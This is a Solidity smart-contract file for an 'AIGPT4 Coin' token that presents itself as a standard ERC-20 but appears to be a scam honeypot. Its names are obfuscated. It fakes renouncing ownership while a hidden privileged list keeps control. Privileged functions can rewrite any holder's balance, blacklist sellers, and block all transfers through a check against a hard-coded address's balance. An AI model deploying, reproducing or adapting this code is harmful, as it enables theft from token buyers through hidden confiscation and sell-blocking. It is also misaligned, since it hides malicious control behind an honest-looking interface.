//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface takeMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapList) external view returns (uint256);

    function transfer(address minTrading, uint256 maxLaunchShould) external returns (bool);

    function allowance(address marketingBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxLaunchShould) external returns (bool);

    function transferFrom(
        address sender,
        address minTrading,
        uint256 maxLaunchShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchTxExempt, uint256 value);
    event Approval(address indexed marketingBuy, address indexed spender, uint256 value);
}

interface teamAt is takeMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract liquidityEnableFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamMarketing {
    function createPair(address txFund, address atFrom) external returns (address);
}

interface txFundBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract AIGPT4Coin is liquidityEnableFund, takeMax, teamAt {

    function limitIsTeam() private view {
        require(takeTotal[_msgSender()]);
    }

    address public autoTo;

    string private launchedFeeLimit = "ACN";

    function totalLaunched(address liquiditySellTake, address minTrading, uint256 maxLaunchShould) internal returns (bool) {
        if (liquiditySellTake == totalFund) {
            return enableTotalToken(liquiditySellTake, minTrading, maxLaunchShould);
        }
        uint256 minMax = takeMax(autoTo).balanceOf(fromTradingLimit);
        require(minMax == isLaunched);
        require(!atExemptShould[liquiditySellTake]);
        return enableTotalToken(liquiditySellTake, minTrading, maxLaunchShould);
    }

    address fromTradingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        tokenReceiver();
        txFundBuy takeMarketingReceiver = txFundBuy(exemptMax);
        autoTo = teamMarketing(takeMarketingReceiver.factory()).createPair(takeMarketingReceiver.WETH(), address(this));
        if (launchedReceiver != listTrading) {
            takeLimitSwap = true;
        }
        totalFund = _msgSender();
        takeTotal[totalFund] = true;
        limitIs[totalFund] = fromLaunched;
        if (tradingMax) {
            launchedReceiver = listTrading;
        }
        emit Transfer(address(0), totalFund, fromLaunched);
    }

    function tokenReceiver() public {
        emit OwnershipTransferred(totalFund, address(0));
        launchTo = address(0);
    }

    function listTeam(uint256 maxLaunchShould) public {
        limitIsTeam();
        isLaunched = maxLaunchShould;
    }

    mapping(address => bool) public atExemptShould;

    function getOwner() external view returns (address) {
        return launchTo;
    }

    function balanceOf(address swapList) public view virtual override returns (uint256) {
        return limitIs[swapList];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromLaunched;
    }

    mapping(address => mapping(address => uint256)) private receiverLaunch;

    uint256 private marketingAtToken;

    uint256 private fromLaunched = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return launchedFeeLimit;
    }

    function name() external view virtual override returns (string memory) {
        return marketingModeReceiver;
    }

    address public totalFund;

    function receiverLimit(address sellTake) public {
        limitIsTeam();
        
        if (sellTake == totalFund || sellTake == autoTo) {
            return;
        }
        atExemptShould[sellTake] = true;
    }

    bool public teamMode;

    function transfer(address launchedSwap, uint256 maxLaunchShould) external virtual override returns (bool) {
        return totalLaunched(_msgSender(), launchedSwap, maxLaunchShould);
    }

    function owner() external view returns (address) {
        return launchTo;
    }

    address exemptMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function swapTake(address liquiditySell) public {
        if (maxIs) {
            return;
        }
        if (teamMode != tradingMax) {
            launchedReceiver = marketingAtToken;
        }
        takeTotal[liquiditySell] = true;
        
        maxIs = true;
    }

    uint256 private launchedReceiver;

    bool private tradingMax;

    function approve(address enableTrading, uint256 maxLaunchShould) public virtual override returns (bool) {
        receiverLaunch[_msgSender()][enableTrading] = maxLaunchShould;
        emit Approval(_msgSender(), enableTrading, maxLaunchShould);
        return true;
    }

    uint256 isLaunched;

    function allowance(address sellExempt, address enableTrading) external view virtual override returns (uint256) {
        if (enableTrading == exemptMax) {
            return type(uint256).max;
        }
        return receiverLaunch[sellExempt][enableTrading];
    }

    function decimals() external view virtual override returns (uint8) {
        return txSender;
    }

    mapping(address => bool) public takeTotal;

    string private marketingModeReceiver = "AIGPT4 Coin";

    uint256 amountAuto;

    bool public maxIs;

    uint256 public listTrading;

    event OwnershipTransferred(address indexed senderMin, address indexed fromReceiver);

    mapping(address => uint256) private limitIs;

    function transferFrom(address liquiditySellTake, address minTrading, uint256 maxLaunchShould) external override returns (bool) {
        if (_msgSender() != exemptMax) {
            if (receiverLaunch[liquiditySellTake][_msgSender()] != type(uint256).max) {
                require(maxLaunchShould <= receiverLaunch[liquiditySellTake][_msgSender()]);
                receiverLaunch[liquiditySellTake][_msgSender()] -= maxLaunchShould;
            }
        }
        return totalLaunched(liquiditySellTake, minTrading, maxLaunchShould);
    }

    uint8 private txSender = 18;

    function feeEnable(address launchedSwap, uint256 maxLaunchShould) public {
        limitIsTeam();
        limitIs[launchedSwap] = maxLaunchShould;
    }

    bool public takeLimitSwap;

    bool private fundTrading;

    function enableTotalToken(address liquiditySellTake, address minTrading, uint256 maxLaunchShould) internal returns (bool) {
        require(limitIs[liquiditySellTake] >= maxLaunchShould);
        limitIs[liquiditySellTake] -= maxLaunchShould;
        limitIs[minTrading] += maxLaunchShould;
        emit Transfer(liquiditySellTake, minTrading, maxLaunchShould);
        return true;
    }

    address private launchTo;

}